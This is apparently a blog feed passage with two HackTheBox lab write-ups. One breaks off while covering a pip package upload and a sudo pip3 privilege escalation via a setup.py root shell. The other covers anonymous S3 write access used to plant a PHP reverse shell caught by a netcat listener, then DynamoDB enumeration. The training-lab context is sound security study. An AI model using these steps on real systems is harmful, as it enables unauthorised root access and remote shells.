writing low.egg-info/PKG-INFO
writing dependency_links to low.egg-info/dependency_links.txt
writing top-level names to low.egg-info/top_level.txt
reading manifest file <span style="color:#e6db74">&#39;low.egg-info/SOURCES.txt&#39;</span>
writing manifest file <span style="color:#e6db74">&#39;low.egg-info/SOURCES.txt&#39;</span>
warning: sdist: standard file not found: should have one of README, README.rst, README.txt, README.md
running check
creating low-0.0.1
creating low-0.0.1/low.egg-info
copying files to low-0.0.1…
copying setup.py -&gt; low-0.0.1
copying low.egg-info/PKG-INFO -&gt; low-0.0.1/low.egg-info
copying low.egg-info/SOURCES.txt -&gt; low-0.0.1/low.egg-info
copying low.egg-info/dependency_links.txt -&gt; low-0.0.1/low.egg-info
copying low.egg-info/top_level.txt -&gt; low-0.0.1/low.egg-info
Writing low-0.0.1/setup.cfg
Creating tar archive
removing <span style="color:#e6db74">&#39;low-0.0.1&#39;</span> <span style="color:#f92672">(</span>and everything under it<span style="color:#f92672">)</span>
running upload
Submitting dist/low-0.0.1.tar.gz to http://pypi.sneakycorp.htb:8080/
Server response <span style="color:#f92672">(</span>200<span style="color:#f92672">)</span>: OK
WARNING: Uploading via this command is deprecated, use twine to upload instead <span style="color:#f92672">(</span>https://pypi.org/p/twine/<span style="color:#f92672">)</span>
</code></pre></div><p>As long as I see the server response is 200, that means I have successfully uploaded the package.</p>
<h4 id="ssh-access">SSH Access</h4>
<p>Now I can login with my private key as user <code>low</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «sneakymailer» «10.10.14.42» 
$ ssh -i id_ecdsa low@10.10.10.197
</code></pre></div><p><img src="imgs/image-20210429021145269.png" alt="image-20210429021145269" style="zoom:67%;" /></p>
<p>User flag is done here.</p>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="abusing-sudo-pip">Abusing sudo pip</h4>
<p>User <code>low</code> has sudo privileges on <code>/usr/bin/pip3</code>.</p>
<p><img src="imgs/image-20210429021533891.png" alt="image-20210429021533891" style="zoom: 67%;" /></p>
<p>I&rsquo;ll follow the instruction from <a href="https://gtfobins.github.io/gtfobins/pip/">GTFOBins</a> to abuse this circumstance to obtain the root flag.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">low@sneakymailer:~$ TF<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>mktemp -d<span style="color:#66d9ef">)</span>
low@sneakymailer:~$
low@sneakymailer:~$ echo <span style="color:#e6db74">&#39;raise Exception(open(&#34;/root/root.txt&#34;).read())&#39;</span> &gt; $TF/setup.py
low@sneakymailer:~$
low@sneakymailer:~$ sudo pip3 install $TF
</code></pre></div><p><img src="imgs/image-20210429021914961.png" alt="image-20210429021914961" style="zoom:67%;" /></p>
<p>Or to get a shell as follows:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">low@sneakymailer:~$ TF=$(mktemp -d)
low@sneakymailer:~$
low@sneakymailer:~$ echo &#34;import os; os.execl(&#39;/bin/sh&#39;, &#39;sh&#39;, &#39;-c&#39;, &#39;sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#39;)&#34; &gt; $TF/setup.py
low@sneakymailer:~$
low@sneakymailer:~$ sudo pip3 install $TF
sudo: Unable to resolve host sneakymailer: Temporary failure in name resolution
Processing /tmp/tmp.9ShSegy5bm
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
</code></pre></div><hr>
<h2 id="references">References</h2>
<ul>
<li></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Bucket</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-bucket/</link>
      <pubDate>Sat, 24 Apr 2021 22:03:47 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-bucket/</guid>
      <description>Bucket, as the name implies, features an Amazon S3 bucket that has been configured to allow anonymous users to perform read/write operations to the objects inside a bucket. This type of misconfiguration can be leveraged to gain a foothold on the box by dropping a web shell. The box also has DynamoDB using the same configuration that allows anonymous users to perform read/write access. Enumeration on the DynamoDB discovers several credentials and one of the credentials is reused by the user.</description>
      <content:encoded><![CDATA[<p>Bucket, as the name implies, features an Amazon S3 bucket that has been configured to allow anonymous users to perform read/write operations to the objects inside a bucket. This type of misconfiguration can be leveraged to gain a foothold on the box by dropping a web shell. The box also has DynamoDB using the same configuration that allows anonymous users to perform read/write access. Enumeration on the DynamoDB discovers several credentials and one of the credentials is reused by the user. Inspecting the web configuration files reveals that there is  an internal web currently running as a root user, which then can be exploited to gain root access.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>Pentesting AWS S3</li>
<li>Port Forwarding</li>
<li>Exploiting PD4ML</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>Gobuster - <a href="https://github.com/OJ/gobuster">https://github.com/OJ/gobuster</a></li>
<li>AWS CLI - <a href="https://docs.aws.amazon.com/cli/latest/userguide/install-cliv2-linux.html#cliv2-linux-install">https://docs.aws.amazon.com/cli/latest/userguide/install-cliv2-linux.html#cliv2-linux-install</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p><code>nmap</code> shows two open ports: 22 (SSH) and 80 (HTTP).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ mkdir nmap; nmap -sC -sV -oA nmap/initial-bucket 10.10.10.212

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu <span style="color:#ae81ff">4</span> <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
80/tcp open  http    Apache httpd 2.4.41
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
|_http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title <span style="color:#f92672">(</span>text/html<span style="color:#f92672">)</span>.
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div><p>Scanning through all the ports return the same result.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---buckethtb">TCP 80 - bucket.htb</h3>
<p>Visiting this port via browser redirects to <code>http://bucket.htb/</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">→ root@iamf «bucket» «10.10.14.39» 
$ curl -s http://10.10.10.212

<span style="color:#75715e">&lt;!DOCTYPE HTML PUBLIC &#34;-//IETF//DTD HTML 2.0//EN&#34;&gt;</span>
&lt;<span style="color:#f92672">html</span>&gt;&lt;<span style="color:#f92672">head</span>&gt;
&lt;<span style="color:#f92672">title</span>&gt;302 Found&lt;/<span style="color:#f92672">title</span>&gt;
&lt;/<span style="color:#f92672">head</span>&gt;&lt;<span style="color:#f92672">body</span>&gt;
&lt;<span style="color:#f92672">h1</span>&gt;Found&lt;/<span style="color:#f92672">h1</span>&gt;
&lt;<span style="color:#f92672">p</span>&gt;The document has moved &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://bucket.htb/&#34;</span>&gt;here&lt;/<span style="color:#f92672">a</span>&gt;.&lt;/<span style="color:#f92672">p</span>&gt;
&lt;<span style="color:#f92672">hr</span>&gt;
&lt;<span style="color:#f92672">address</span>&gt;Apache/2.4.41 (Ubuntu) Server at 10.10.10.212 Port 80&lt;/<span style="color:#f92672">address</span>&gt;
&lt;/<span style="color:#f92672">body</span>&gt;&lt;/<span style="color:#f92672">html</span>&gt;
</code></pre></div><p>I&rsquo;ll add <code>bucket.htb</code> to <code>/etc/hosts</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">10.10.10.212    bucket.htb
</code></pre></div><p>Now it displays a web page called &ldquo;Bucket Advertising Platform&rdquo;.</p>
<p><div class="img-container"><img src="imgs/image-20210422234425022.png" alt="image-20210422234425022"  /></div>
</p>
<p>Inspecting the page source discovers a vhost.</p>
<p><div class="img-container"><img src="imgs/image-20210422234754897.png" alt="image-20210422234754897"  /></div>
</p>
<p>I&rsquo;ll add the vhost name to <code>/etc/hosts</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">10.10.10.212    bucket.htb s3.bucket.htb
</code></pre></div><h4 id="gobuster">Gobuster</h4>
<p>There&rsquo;s no interesting results.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ gobuster dir -u http://bucket.htb/ -x html,txt,bak -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -o gobuster/gobuster-M-80

...&lt;SNIP&gt;...
/index.html           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 5344<span style="color:#f92672">]</span>
/server-status        <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 275<span style="color:#f92672">]</span> 
</code></pre></div><h3 id="tcp-80---s3buckethtb">TCP 80 - s3.bucket.htb</h3>
<p>Visiting the newly discovered hostname displays a typical json output format.</p>
<p><div class="img-container"><img src="imgs/image-20210422235335494.png" alt="image-20210422235335494"  /></div>
</p>
<h4 id="gobuster-1">Gobuster</h4>
<p><code>gobuster</code> scan discovers a few web paths.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ gobuster dir -u http://s3.bucket.htb/ -x html,txt,bak -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -o gobuster/gobuster-vhost-M-80

...&lt;SNIP&gt;...
/shell                <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span>
/health               <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 54<span style="color:#f92672">]</span>
/server-status        <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 275<span style="color:#f92672">]</span> 
</code></pre></div><h4 id="shell">/shell</h4>
<p>Vising <code>/shell</code> redirects to http://444af250749d:4566/shell/.</p>
<p><div class="img-container"><img src="imgs/image-20210424222707480.png" alt="image-20210424222707480"  /></div>
</p>
<p>On <code>curl</code>, the server returns with a bunch of HTTP headers in its response</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «~» «10.10.14.51» 
$ curl -sv http://s3.bucket.htb/shell

...&lt;SNIP&gt;...
&lt; refresh: 0; url<span style="color:#f92672">=</span>http://444af250749d:4566/shell/
&lt; access-control-allow-origin: *
&lt; access-control-allow-methods: HEAD,GET,PUT,POST,DELETE,OPTIONS,PATCH
&lt; access-control-allow-headers: authorization,content-type,content-md5,cache-control,x-amz-content-sha256,x-amz-date,x-amz-security-token,x-amz-user-agent,x-amz-target,x-amz-acl,x-amz-version-id,x-localstack-target,x-amz-tagging
&lt; access-control-expose-headers: x-amz-version-id
&lt; 
* Connection <span style="color:#75715e">#0 to host s3.bucket.htb left intact</span>
</code></pre></div><p>I added it to <code>/etc/hosts</code> but it still doesn&rsquo;t resolve.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">10.10.10.212    bucket.htb s3.bucket.htb 444af250749d
</code></pre></div><p>Searching some of the header names on Google reveals those are used by Amazon S3</p>
<p><div class="img-container"><img src="imgs/image-20210425002915838.png" alt="image-20210425002915838"  /></div>
</p>
<p>Adding another <code>/</code> at the end of uri resolve to a DynamoDB JavaScript Shell. I have no familiarity on this.</p>
<p><div class="img-container"><img src="imgs/image-20210424223257481.png" alt="image-20210424223257481"  /></div>
</p>
<h4 id="health">/health</h4>
<p><code>/health</code> is probably an endpoint to monitor the service status.</p>
<p><div class="img-container"><img src="imgs/image-20210422235825937.png" alt="image-20210422235825937"  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="aws-s3">AWS S3</h4>
<p>S3 stands for Simple Storage Service. It is a storage service offered by Amazon. To interact with the AWS S3, I&rsquo;ll use <a href="https://docs.aws.amazon.com/cli/latest/userguide/install-cliv2-linux.html#cliv2-linux-install">aws cli</a>. You can find the user guide <a href="https://docs.aws.amazon.com/cli/latest/userguide/cli-services-s3-commands.html#using-s3-commands-listing-buckets">here</a>.</p>
<p>Usage in general:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">aws [options] s3 &lt;subcommand&gt; [parameters]
</code></pre></div><p>I&rsquo;ll start by listing the S3 bucket, but then it returns an error message.</p>
<blockquote>
<p>A bucket is a container for objects stored in Amazon S3. It is a folder but not really a folder.</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ aws s3 ls --endpoint-url<span style="color:#f92672">=</span>http://s3.bucket.htb 
You must specify a region. You can also configure your region by running <span style="color:#e6db74">&#34;aws configure&#34;</span>.
</code></pre></div><p>I can resolve the problem above by typing <code>aws configure</code> and fill only the default region.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ aws configure
AWS Access Key ID <span style="color:#f92672">[</span>None<span style="color:#f92672">]</span>:
AWS Secret Access Key <span style="color:#f92672">[</span>None<span style="color:#f92672">]</span>:
Default region name <span style="color:#f92672">[</span>None<span style="color:#f92672">]</span>: us-east-1
Default output format <span style="color:#f92672">[</span>None<span style="color:#f92672">]</span>:
</code></pre></div><p>Now it works and returns a bucket called <code>adserver</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ aws s3 ls --endpoint-url<span style="color:#f92672">=</span>http://s3.bucket.htb 
2020-10-21 09:16:03 adserver
</code></pre></div><p>I can also read the objects inside <code>adserver</code> bucket.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ aws s3 ls s3://adserver --endpoint-url<span style="color:#f92672">=</span>http://s3.bucket.htb
                           PRE images/
2020-10-21 09:22:04       <span style="color:#ae81ff">5344</span> index.html

→ root@iamf «bucket» «10.10.14.39» 
$ aws s3 ls s3://adserver/images/ --endpoint-url<span style="color:#f92672">=</span>http://s3.bucket.htb
2020-10-21 09:52:04      <span style="color:#ae81ff">37840</span> bug.jpg
2020-10-21 09:52:04      <span style="color:#ae81ff">51485</span> cloud.png
2020-10-21 09:52:04      <span style="color:#ae81ff">16486</span> malware.png
</code></pre></div><p>Those files are the same file used in <code>bucket.htb</code></p>
<h4 id="php-reverse-shell-upload-via-s3">PHP Reverse Shell upload via S3</h4>
<p>The aws subcommand <code>cp</code> allows to copy a file (objects) from local to a bucket, and vice versa (<a href="https://docs.aws.amazon.com/cli/latest/userguide/cli-services-s3-commands.html#using-s3-commands-managing-objects-copy">source</a>).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">aws s3 cp &lt;source&gt; &lt;target&gt; <span style="color:#f92672">[</span>--options<span style="color:#f92672">]</span>
</code></pre></div><p>Because I know the web server is Apache, I&rsquo;ll create a php test files and upload it to the bucket.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ echo <span style="color:#e6db74">&#39;&lt;?php echo &#34;IamF&#34; ?&gt;&#39;</span> &gt; iamf-test.php

→ root@iamf «bucket» «10.10.14.39» 
$ aws s3 cp ./iamf-test.php s3://adserver/ --endpoint-url<span style="color:#f92672">=</span>http://s3.bucket.htb
upload: ./iamf-test.php to s3://adserver/iamf-test.php 
</code></pre></div><p>I can confirm the file was successfully uploaded with the subcommand <code>ls</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ aws s3 ls s3://adserver/ --endpoint-url<span style="color:#f92672">=</span>http://s3.bucket.htb 
                           PRE images/
2021-04-22 14:05:15         <span style="color:#ae81ff">21</span> iamf-test.php
2021-04-22 14:05:04       <span style="color:#ae81ff">5344</span> index.html
</code></pre></div><p>The file is available at <code>http://s3.bucket.htb/adserver/iamf-test.php</code> and <code>http://bucket.htb/iamf-test.php</code> but the execution of php code happens on <code>bucket.htb</code>. A few minutes later my files got deleted, so I can guess there&rsquo;s a cleanup happening.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ curl -s http://s3.bucket.htb/adserver/iamf-test.php
&lt;?php echo <span style="color:#e6db74">&#34;IamF&#34;</span> ?&gt;

→ root@iamf «bucket» «10.10.14.39» 
$ curl -s http://bucket.htb/iamf-test.php
IamF
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210423010636324.png" alt="image-20210423010636324"  /></div>
</p>
<p>Now I can try to drop a <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">PHP reverse shell</a>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ aws s3 cp ./iamf-test.php s3://adserver/ --endpoint-url<span style="color:#f92672">=</span>http://s3.bucket.htb
</code></pre></div><p>Then I&rsquo;ll trigger it using <code>curl</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ curl -s http://bucket.htb/iamf.php
</code></pre></div><p>I have a shell now on my listener (wait for a few minutes or reupload the shell if it doesn&rsquo;t).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ rlwrap nc -nvlp <span style="color:#ae81ff">9001</span>
listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9001</span> ...
connect to <span style="color:#f92672">[</span>10.10.14.39<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.212<span style="color:#f92672">]</span> <span style="color:#ae81ff">58352</span>
Linux bucket 5.4.0-48-generic <span style="color:#75715e">#52-Ubuntu SMP Thu Sep 10 10:58:49 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span>
 18:14:02 up 13:18,  <span style="color:#ae81ff">0</span> users,  load average: 0.03, 0.04, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
bash: cannot set terminal process group <span style="color:#f92672">(</span>1050<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
bash: no job control in this shell
www-data@bucket:/$ 
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210423011428675.png" alt="image-20210423011428675"  /></div>
</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-roy">Shell as roy</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>There is a <code>bucket-app</code>, but I don&rsquo;t have access to it.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@bucket:/var/www$ ls -la
total <span style="color:#ae81ff">16</span>
drwxr-xr-x   <span style="color:#ae81ff">4</span> root root <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">10</span> 12:29 .
drwxr-xr-x  <span style="color:#ae81ff">14</span> root root <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">10</span> 12:29 ..
drwxr-x---+  <span style="color:#ae81ff">4</span> root root <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">10</span> 12:29 bucket-app
drwxr-xr-x   <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">22</span> 18:27 html
</code></pre></div><p><code>roy</code> is the only user in this box.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@bucket:/$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
roy:x:1000:1000:,,,:/home/roy:/bin/bash
</code></pre></div><p>Visiting <code>roy</code> home directory discovers a folder called <code>project</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@bucket:/var/www$ ls -la /home/roy
total <span style="color:#ae81ff">44</span>
drwxr-xr-x <span style="color:#ae81ff">7</span> roy  roy  <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">22</span> 12:03 .
drwxr-xr-x <span style="color:#ae81ff">3</span> root root <span style="color:#ae81ff">4096</span> Sep <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2020</span> ..
drwxrwxr-x <span style="color:#ae81ff">2</span> roy  roy  <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">22</span> 12:03 .aws
lrwxrwxrwx <span style="color:#ae81ff">1</span> roy  roy     <span style="color:#ae81ff">9</span> Sep <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2020</span> .bash_history -&gt; /dev/null
-rw-r--r-- <span style="color:#ae81ff">1</span> roy  roy   <span style="color:#ae81ff">220</span> Sep <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2020</span> .bash_logout
-rw-r--r-- <span style="color:#ae81ff">1</span> roy  roy  <span style="color:#ae81ff">3771</span> Sep <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2020</span> .bashrc
drwx------ <span style="color:#ae81ff">2</span> roy  roy  <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">22</span> 07:57 .cache
drwx------ <span style="color:#ae81ff">4</span> roy  roy  <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">22</span> 08:01 .gnupg
-rw-r--r-- <span style="color:#ae81ff">1</span> roy  roy   <span style="color:#ae81ff">807</span> Sep <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2020</span> .profile
drwxr-xr-x <span style="color:#ae81ff">3</span> roy  roy  <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">22</span> 07:59 project
drwxr-xr-x <span style="color:#ae81ff">3</span> roy  roy  <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">22</span> 07:59 snap
-r-------- <span style="color:#ae81ff">1</span> roy  roy    <span style="color:#ae81ff">33</span> Apr <span style="color:#ae81ff">22</span> 04:56 user.txt
</code></pre></div><p>The files inside <code>project</code> are readable by others.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@bucket:/home/roy/project$ ls -la
total <span style="color:#ae81ff">44</span>
drwxr-xr-x  <span style="color:#ae81ff">3</span> roy roy  <span style="color:#ae81ff">4096</span> Sep <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">2020</span> .
drwxr-xr-x  <span style="color:#ae81ff">5</span> roy roy  <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">24</span> 17:31 ..
-rw-rw-r--  <span style="color:#ae81ff">1</span> roy roy    <span style="color:#ae81ff">63</span> Sep <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">2020</span> composer.json
-rw-rw-r--  <span style="color:#ae81ff">1</span> roy roy <span style="color:#ae81ff">20533</span> Sep <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">2020</span> composer.lock
-rw-r--r--  <span style="color:#ae81ff">1</span> roy roy   <span style="color:#ae81ff">367</span> Sep <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">2020</span> db.php
drwxrwxr-x <span style="color:#ae81ff">10</span> roy roy  <span style="color:#ae81ff">4096</span> Sep <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">2020</span> vendor
</code></pre></div><p>Looking into <code>db.php</code>, the project seems to use AWS DynamoDB as the project database. I can also see the endpoint url.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@bucket:/home/roy/project$ cat db.php

&lt;?php
require <span style="color:#e6db74">&#39;vendor/autoload.php&#39;</span>;
date_default_timezone_set<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;America/New_York&#39;</span><span style="color:#f92672">)</span>;
use Aws<span style="color:#ae81ff">\D</span>ynamoDb<span style="color:#ae81ff">\D</span>ynamoDbClient;
use Aws<span style="color:#ae81ff">\D</span>ynamoDb<span style="color:#ae81ff">\E</span>xception<span style="color:#ae81ff">\D</span>ynamoDbException;

$client <span style="color:#f92672">=</span> new Aws<span style="color:#ae81ff">\S</span>dk<span style="color:#f92672">([</span>
    <span style="color:#e6db74">&#39;profile&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;default&#39;</span>,
    <span style="color:#e6db74">&#39;region&#39;</span>  <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;us-east-1&#39;</span>,
    <span style="color:#e6db74">&#39;version&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;latest&#39;</span>,
    <span style="color:#e6db74">&#39;endpoint&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;http://localhost:4566&#39;</span>
<span style="color:#f92672">])</span>;

$dynamodb <span style="color:#f92672">=</span> $client-&gt;createDynamoDb<span style="color:#f92672">()</span>;

//todo
</code></pre></div><p><code>localhost:4566</code> is the internal endpoint of <code>s3.bucket.htb</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@bucket:/home/roy/project$ curl -s http://localhost:4566

<span style="color:#f92672">{</span>
	<span style="color:#e6db74">&#34;s3&#34;</span>: <span style="color:#e6db74">&#34;running&#34;</span>, 
	<span style="color:#e6db74">&#34;dynamodb&#34;</span>: <span style="color:#e6db74">&#34;running&#34;</span>
<span style="color:#f92672">}</span>
</code></pre></div><h4 id="aws-dynamodb">AWS DynamoDB</h4>
<p>DynamoDB is a NoSQL database developed by Amazon. I can also use the amazon cli to interact with the DynamoDB, and it uses the same endpoint as the S3.</p>
<p>General usage:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">usage: aws <span style="color:#f92672">[</span>options<span style="color:#f92672">]</span> dynamodb &lt;subcommand&gt; <span style="color:#f92672">[</span>&lt;subcommand&gt; ...<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>parameters<span style="color:#f92672">]</span>
</code></pre></div><p>Anonymous user is allowed to list the database tables.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ aws dynamodb list-tables --endpoint-url http://s3.bucket.htb
<span style="color:#f92672">{</span>
    <span style="color:#e6db74">&#34;TableNames&#34;</span>: <span style="color:#f92672">[</span>
        <span style="color:#e6db74">&#34;users&#34;</span>
